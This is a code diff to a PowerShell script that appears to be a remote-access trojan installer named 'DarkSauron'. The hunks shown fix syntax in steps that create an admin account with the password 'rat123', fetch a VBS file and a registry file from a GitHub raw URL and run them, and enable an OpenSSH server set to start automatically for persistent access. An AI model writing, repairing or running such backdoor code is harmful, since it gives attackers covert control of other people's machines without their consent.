@@ -32,7 +32,7 @@ function create_account {
     }
 
 #create admin user
-$uname = "random_text"
+$uname = random_text
 $pword = (ConvertTo-SecureString "rat123"-AsPlainText -Force)
 create_account  -uname $uname -pword $pword
 
@@ -47,7 +47,7 @@ Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSaur
 #visual basic script to registry
 $vbs_file = random_text
 Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile
-"$vbs_file.vbs".ps1
+"$vbs_file.vbs"
 
 #install the registry
 ./"$reg_file.reg";"$vbs_file.vbs"
@@ -73,7 +73,7 @@ $initial_dir = Get-Location
 
 
 #enabling  the presistance ssh 
-Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service  -Name sshd -StartupType 'Automatic' Get-NetFirewallRule - Name *ssh* 
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service  -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh* 
 
 
 #goto temp ,make working directory
